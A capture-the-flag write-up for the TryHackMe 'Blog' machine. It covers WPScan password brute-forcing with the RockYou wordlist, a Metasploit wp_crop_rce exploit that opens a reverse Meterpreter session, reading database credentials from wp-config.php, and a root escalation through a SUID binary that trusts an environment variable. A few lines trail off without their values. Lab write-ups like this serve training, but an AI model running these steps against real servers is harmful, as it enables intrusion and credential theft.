@@ -1,0 +1,185 @@
+TryHackMe — Blog
+
+Platform: TryHackMe
+Machine: Blog
+Difficulty: Medium
+Category: WordPress / Web Exploitation / Privilege Escalation
+Hostname: blog.thm
+
+
+ 1. Reconnaissance
+
+I started by checking whether the target was reachable: ping <ip>
+The host responded successfully, confirming that the machine was accessible through the TryHackMe VPN. 
+I then performed an Nmap scan:nmap -sC -sV -p- <ip>
+Nmap Results
+
+| Port | Service     | Version              |
+| ---- | ----------- | -------------------- |
+| 22   | SSH         | OpenSSH 7.6p1 Ubuntu |
+| 80   | HTTP        | Apache 2.4.29        |
+| 139  | NetBIOS/SMB | Samba                |
+| 445  | SMB         | Samba 4.7.6          |
+The web server was hosting a WordPress installation titled **"Billy Joel's IT Blog"**, and Nmap identified **WordPress 5.0**. SMB was also accessible through ports 139 and 445. 
+The hostname was identified as:
+I therefore added the hostname to /etc/hosts:
+and added:ip : blog.thm
+
+2. WordPress Enumeration
+
+Since the target was running WordPress, I used WPScan: wpscan --url blog.thm --enumerate vp
+The scan identified several interesting findings:
+
+WordPress version: 5.0
+XML-RPC enabled
+/wp-admin/ exposed
+WordPress readme.html accessible
+Directory listing enabled on /wp-content/uploads/
+WP-Cron enabled
+Theme: twentytwenty
+No plugins were detected through passive enumeration. 
+The most interesting finding was the old WordPress version: WordPress 5.0
+
+ 3. Obtaining WordPress Credentials
+
+I had identified the WordPress username: kwheel and bjeol 
+I attempted to use WPScan with the RockYou wordlist.
+Initially, WPScan returned: 
+I then performed the password attack: wpscan --url http://blog.thm \ -U kwheel \ -P /usr/share/wordlists/rockyou.txt and 
+wpscan --url http://blog.thm \ -U bjoel \ -P /usr/share/wordlists/rockyou.txt
+WPScan successfully discovered the credentials:
+Username: kwheel
+Password: cutiepie1
+
+4. Exploiting WordPress
+
+With valid WordPress credentials, I searched Metasploit for a WordPress vulnerability: msfconsole -q
+Then: search 2019-8943
+This returned: exploit/multi/http/wp_crop_rce
+The exploit is associated with CVE-2019-8943, a WordPress image/crop-related remote code execution vulnerability.
+I selected the module: use exploit/multi/http/wp_crop_rce
+The module required:
+
+WordPress username
+WordPress password
+Target IP
+Local VPN IP
+I configured it with:
+set RHOSTS 10.49.131.25
+set USERNAME kwheel
+set PASSWORD cutiepie1
+set LHOST 192.168.129.177
+The LHOST was my TryHackMe VPN interface (`tun0`). 
+I then launched the exploit: exploit
+The exploit successfully authenticated to WordPress, uploaded the payload, and opened a Meterpreter session:
+Meterpreter session 1 opened
+
+5. Initial Access
+
+I checked the current user: getuid
+
+The result was: Server username: www-data
+So I had obtained a shell as the web server user: www-data
+
+I then dropped into a normal shell: shell
+and upgraded the shell using Python: python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+The current working directory was:/var/www/wordpress
+
+6. WordPress Configuration File
+
+Since I had access to the WordPress installation, I inspected: cat wp-config.php
+The configuration file contained the database information:
+Database: blog
+Username: wordpressuser
+Password: [redacted]
+Host: localhost
+The configuration also contained the WordPress authentication keys and salts. 
+
+Security Lesson
+
+wp-config.php is an extremely sensitive file because it can contain:
+
+Database credentials
+Authentication secrets
+Database configuration
+WordPress security keys
+A compromised web-server account that can read this file may expose additional credentials and secrets.
+
+
+7. Privilege Escalation Enumeration
+
+I searched for SUID binaries: find / -perm -4000 2>/dev/null
+
+Among the results was: /usr/sbin/checker
+I investigated the binary: file /usr/sbin/checker
+It was identified as: setuid, setgid ELF 64-bit LSB shared object
+This made it particularly interesting because SUID programs execute with the privileges of their owner.
+
+8. Analyzing the SUID Binary
+
+I used `ltrace` to observe the library calls made by the binary: ltrace /usr/sbin/checker
+The output showed:
+getenv("admin") = nil
+puts("Not an Admin")
+This revealed that the program was checking for an environment variable named: admin
+I therefore tested:
+export admin=1
+Then executed: /usr/sbin/checker
+The binary spawned a root shell.
+I verified the privilege level: whoami
+Output: root
+ 
+Privilege Escalation Root Cause
+The vulnerability was caused by an improperly designed **SUID binary** that trusted an attacker-controlled environment variable.
+The binary checked: admin
+and treated the presence/value of that variable as sufficient to grant administrative privileges.
+Because the binary was running with SUID privileges, this resulted in **privilege escalation from `www-data` to `root`**.
+
+
+9. User Flag
+
+After obtaining root access, I searched for the user flag: find / -name user.txt
+This revealed:
+/home/bjoel/user.txt
+/media/usb/user.txt
+The copy under `/home/bjoel/` contained a decoy message: 
+You won't find what you're looking for here.
+TRY HARDER
+
+The actual flag was located at: /media/usb/user.txt
+Reading the file produced the user flag.
+
+10. Root Flag
+
+Finally, I searched for the root flag: find / -name root.txt
+The flag was located at: /root/root.txt
+I read it with: cat /root/root.txt
+and obtained the root flag. 
+
+Tools Used
+
+* Nmap
+* WPScan
+* Metasploit Framework
+* Meterpreter
+* Python
+* ltrace
+* Linux enumeration commands
+* RockYou wordlist
+
+
+Lessons Learned
+
+This machine demonstrated a complete penetration-testing workflow:
+
+1. **Reconnaissance** — identify exposed services.
+2. **Web enumeration** — identify WordPress and its configuration.
+3. **Credential discovery** — identify a valid WordPress account.
+4. **Vulnerability research** — identify an applicable WordPress vulnerability.
+5. **Exploitation** — obtain remote code execution.
+6. **Post-exploitation** — inspect the WordPress installation and configuration.
+7. **Privilege escalation enumeration** — search for SUID binaries.
+8. **Binary analysis** — use `ltrace` to understand program behavior.
+9. **Privilege escalation** — exploit the vulnerable SUID program.
+10. **Flag collection** — locate the user and root flags.
